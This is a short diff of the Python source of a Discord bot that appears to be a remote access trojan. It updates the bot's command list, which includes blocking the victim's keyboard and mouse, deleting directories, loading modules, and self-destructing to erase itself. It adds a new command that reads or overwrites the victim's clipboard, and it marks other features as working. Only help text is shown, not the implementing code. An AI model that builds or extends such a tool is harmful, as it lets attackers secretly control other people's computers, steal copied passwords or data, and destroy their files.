@@ -73,9 +73,10 @@ async def on_message(message):
             .blockinput - Block all input from the user's keyboard and mouse.
             .unblockinput - Unblock all input from the user's keyboard and mouse.
             .selfdestruct - Run a .bat file that removes the bot and all it's features from the computer.
-            .deletedir - Delete a directory. Usage: .deletedir <full dir path>. Example: .deletedir c:/Users/user/Desktop/MyFolder BROKEN
+            .deletedir - Delete a directory. Usage: .deletedir <full dir path>. Example: .deletedir c:/Users/user/Desktop/MyFolder
             .createdir - Create a directory. Usage: .createdir <new dir path>. Example .createdir c:/Users/user/Desktop/MyNewFolder
-            .modules - List/run modules in the /modules folder. Usage: .modules <list/load> BROKEN
+            .modules - List/run modules in the /modules folder. Usage: .modules <list/load>
+            .clipboard - Get/set the current clipboard item. Usage: .clipboard <get/set> <if you used ".clipboard set" parse the text to put into clipboard here> Note: .clipboard get returns the CURRENT copied text, not the whole history.
         """
         embed = discord.Embed(title="Command list", description=commandlist)
         await message.channel.send(embed=embed)
